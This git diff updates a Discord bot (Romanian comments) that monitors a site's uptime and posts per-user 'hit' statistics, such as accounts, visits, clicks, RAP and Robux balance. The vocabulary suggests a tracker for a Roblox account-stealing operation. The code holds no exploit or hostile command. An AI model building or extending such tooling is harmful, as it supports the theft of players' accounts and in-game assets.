@@ -1,8 +1,15 @@
 // 1️⃣ Importuri
 const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
 const fetch = require('node-fetch');
+const express = require('express');
 
-// 2️⃣ Creezi clientul Discord
+// 2️⃣ Server Express pentru keep-alive (Render)
+const app = express();
+const PORT = process.env.PORT || 3000;
+app.get("/", (req, res) => res.send("Bot is alive ✅"));
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+
+// 3️⃣ Creezi clientul Discord
 const client = new Client({ 
   intents: [
     GatewayIntentBits.Guilds, 
@@ -12,11 +19,6 @@ const client = new Client({
 });
 
 const TOKEN = process.env.DISCORD_BOT_TOKEN;
-
-// 3️⃣ Eveniment ready
-client.once('ready', () => {
-  console.log(`✅ Bot ready as ${client.user.tag}`);
-});
 
 // 4️⃣ Funcții utile
 function formatNumber(num) { return num?.toLocaleString() || "0"; }
@@ -40,6 +42,7 @@ setInterval(async () => {
   try {
     const start = Date.now();
     let res, ping;
+
     try { 
       const response = await fetch(MAIN_SITE_URL); 
       res = { ok: response.ok }; 
@@ -60,7 +63,7 @@ setInterval(async () => {
           .setColor(0x00BFFF) // baby blue
           .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif") // coroana animata
           .setDescription(
-            `<a:emoji_21:1437163698161717468> **SITE STATUS**\n\n` +
+            `<a:emoji_23:1437165438315532431> **SITE STATUS**\n\n` +
             `<a:emoji_21:1437163698161717468> **${MAIN_SITE_NAME}**\n` +
             `<a:emoji_21:1437163698161717468> STATUS: ${currentStatus}\n` +
             `<a:emoji_21:1437163698161717468> Response Time: ${ping ? ping + "ms" : "N/A"}`
@@ -76,7 +79,7 @@ setInterval(async () => {
   } catch (err) { console.error("Error checking site:", err); }
 }, 30000);
 
-// 6️⃣ Mesaje
+// 6️⃣ Event listener pentru mesaje
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return;
 
@@ -96,29 +99,35 @@ client.on('messageCreate', async (message) => {
 
       const embed = new EmbedBuilder()
         .setColor(0x00BFFF)
-        .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif") // coroana
-        .setDescription(
-          `<a:emoji_23:1437165438315532431> **─── NORMAL INFO ───**\n\n` +
-          `<a:emoji_21:1437163698161717468> **User:** ${userName}\n\n` +
-          `<a:emoji_21:1437163698161717468> **TOTAL STATS:**\n` +
-          `Hits: ${formatNumber(normal.Totals?.Accounts)}\n` +
-          `Visits: ${formatNumber(normal.Totals?.Visits)}\n` +
-          `Clicks: ${formatNumber(normal.Totals?.Clicks)}\n\n` +
-          `<a:emoji_21:1437163698161717468> **BIGGEST HIT:**\n` +
-          `Summary: ${formatNumber(normal.Highest?.Summary)}\n` +
-          `RAP: ${formatNumber(normal.Highest?.Rap)}\n` +
-          `Robux: ${formatNumber(normal.Highest?.Balance)}\n\n` +
-          `<a:emoji_21:1437163698161717468> **TOTAL HIT STATS:**\n` +
-          `Summary: ${formatNumber(normal.Totals?.Summary)}\n` +
-          `RAP: ${formatNumber(normal.Totals?.Rap)}\n` +
-          `Robux: ${formatNumber(normal.Totals?.Balance)}`
-        )
-        .setImage("https://i.imgur.com/rCQ33gA.gif") // banner jos
+        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
+        .setDescription(`─── <a:emoji_23:1437165438315532431> **NORMAL INFO** ───
+
+<a:emoji_21:1437163698161717468> **User:** **${userName}**
+
+<a:emoji_21:1437163698161717468> **TOTAL STATS:**
+Hits: ${formatNumber(normal.Totals?.Accounts)}
+Visits: ${formatNumber(normal.Totals?.Visits)}
+Clicks: ${formatNumber(normal.Totals?.Clicks)}
+
+<a:emoji_21:1437163698161717468> **BIGGEST HIT:**
+Summary: ${formatNumber(normal.Highest?.Summary)}
+RAP: ${formatNumber(normal.Highest?.Rap)}
+Robux: ${formatNumber(normal.Highest?.Balance)}
+
+<a:emoji_21:1437163698161717468> **TOTAL HIT STATS:**
+Summary: ${formatNumber(normal.Totals?.Summary)}
+RAP: ${formatNumber(normal.Totals?.Rap)}
+Robux: ${formatNumber(normal.Totals?.Balance)}
+`)
+        .setImage("https://i.imgur.com/rCQ33gA.gif")
         .setFooter({ text: "Stats Bot" });
 
       await message.channel.send({ embeds: [embed] });
 
-    } catch (err) { console.error(err); message.reply("❌ Error fetching stats."); }
+    } catch (err) {
+      console.error('Error fetching stats:', err);
+      message.reply("❌ Error fetching stats. Please try again later.");
+    }
   }
 
   // ===== !daily =====
@@ -134,29 +143,35 @@ client.on('messageCreate', async (message) => {
 
       const embed = new EmbedBuilder()
         .setColor(0x00BFFF)
-        .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif") // coroana
-        .setDescription(
-          `<a:emoji_23:1437165438315532431> **─── DAILY STATS ───**\n\n` +
-          `<a:emoji_21:1437163698161717468> **User:** ${userName}\n\n` +
-          `<a:emoji_21:1437163698161717468> **DAILY STATS:**\n` +
-          `Hits: ${formatNumber(daily.Totals?.Accounts)}\n` +
-          `Visits: ${formatNumber(daily.Totals?.Visits)}\n` +
-          `Clicks: ${formatNumber(daily.Totals?.Clicks)}\n\n` +
-          `<a:emoji_21:1437163698161717468> **BIGGEST HIT:**\n` +
-          `Summary: ${formatNumber(daily.Highest?.Summary)}\n` +
-          `RAP: ${formatNumber(daily.Highest?.Rap)}\n` +
-          `Robux: ${formatNumber(daily.Highest?.Balance)}\n\n` +
-          `<a:emoji_21:1437163698161717468> **TOTAL HIT STATS:**\n` +
-          `Summary: ${formatNumber(daily.Totals?.Summary)}\n` +
-          `RAP: ${formatNumber(daily.Totals?.Rap)}\n` +
-          `Robux: ${formatNumber(daily.Totals?.Balance)}`
-        )
-        .setImage("https://i.imgur.com/rCQ33gA.gif") // banner jos
+        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
+        .setDescription(`─── <a:emoji_23:1437165438315532431> **DAILY STATS** ───
+
+<a:emoji_21:1437163698161717468> **User:** **${userName}**
+
+<a:emoji_21:1437163698161717468> **DAILY STATS:**
+Hits: ${formatNumber(daily.Totals?.Accounts)}
+Visits: ${formatNumber(daily.Totals?.Visits)}
+Clicks: ${formatNumber(daily.Totals?.Clicks)}
+
+<a:emoji_21:1437163698161717468> **BIGGEST HIT:**
+Summary: ${formatNumber(daily.Highest?.Summary)}
+RAP: ${formatNumber(daily.Highest?.Rap)}
+Robux: ${formatNumber(daily.Highest?.Balance)}
+
+<a:emoji_21:1437163698161717468> **TOTAL HIT STATS:**
+Summary: ${formatNumber(daily.Totals?.Summary)}
+RAP: ${formatNumber(daily.Totals?.Rap)}
+Robux: ${formatNumber(daily.Totals?.Balance)}
+`)
+        .setImage("https://i.imgur.com/rCQ33gA.gif")
         .setFooter({ text: "Stats Bot Daily" });
 
       await message.channel.send({ embeds: [embed] });
 
-    } catch (err) { console.error(err); message.reply("❌ Error fetching daily stats."); }
+    } catch (err) {
+      console.error('Error fetching daily stats:', err);
+      message.reply("❌ Error fetching daily stats. Please try again later.");
+    }
   }
 
   // ===== !check =====
@@ -167,48 +182,33 @@ client.on('messageCreate', async (message) => {
       try { const response = await fetch(MAIN_SITE_URL); res = { ok: response.ok }; ping = Date.now() - start; } 
       catch { res = { ok: false }; ping = null; }
 
-      let statusText = res.ok ? "**ONLINE**" : "OFFLINE";
+      let statusText = res.ok ? "<a:emoji_22:1437165310775132160> ONLINE" : "<a:emoji_22:1437165310775132160> OFFLINE";
       let uptimeText = res.ok && lastUpTime ? `UP for ${formatDuration(Date.now() - lastUpTime)}` : "❌ No uptime data";
 
       const embed = new EmbedBuilder()
         .setColor(0x00BFFF)
-        .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif") // coroana
-        .setDescription(
-          `<a:emoji_23:1437165438315532431> **SITE STATUS**\n\n` +
+        .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif")
+        .setDescription(`<a:emoji_23:1437165438315532431> **SITE STATUS**\n\n` +
           `<a:emoji_21:1437163698161717468> **${MAIN_SITE_NAME}**\n` +
           `<a:emoji_21:1437163698161717468> STATUS: ${statusText}\n` +
           `<a:emoji_21:1437163698161717468> UPTIME: ${uptimeText}\n` +
           `<a:emoji_21:1437163698161717468> Response Time: ${ping ? ping + "ms" : "N/A"}`
         )
-        .setImage("https://i.imgur.com/rCQ33gA.gif") // banner jos
+        .setImage("https://i.imgur.com/rCQ33gA.gif")
         .setFooter({ text: "Site Uptime Monitor" });
 
       await message.channel.send({ embeds: [embed] });
 
     } catch (err) {
       console.error(err);
-      const embed = new EmbedBuilder()
-        .setColor(0x00BFFF)
-        .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif")
-        .setDescription(
-          `<a:emoji_23:1437165438315532431> **SITE STATUS**\n\n` +
-          `<a:emoji_21:1437163698161717468> **${MAIN_SITE_NAME}**\n` +
-          `<a:emoji_21:1437163698161717468> STATUS: OFFLINE\n` +
-          `<a:emoji_21:1437163698161717468> UPTIME: No uptime data`
-        )
-        .setImage("https://i.imgur.com/rCQ33gA.gif")
-        .setFooter({ text: "Site Uptime Monitor" });
-
-      await message.channel.send({ embeds: [embed] });
     }
   }
+
 });
 
 // 7️⃣ Error handler
 client.on('error', (error) => console.error('Discord client error:', error));
 
-// 8️⃣ Verificare token
+// 8️⃣ Login bot
 if (!TOKEN) { console.error('❌ DISCORD_BOT_TOKEN is not set!'); process.exit(1); }
-
-// 9️⃣ Login bot
 client.login(TOKEN);
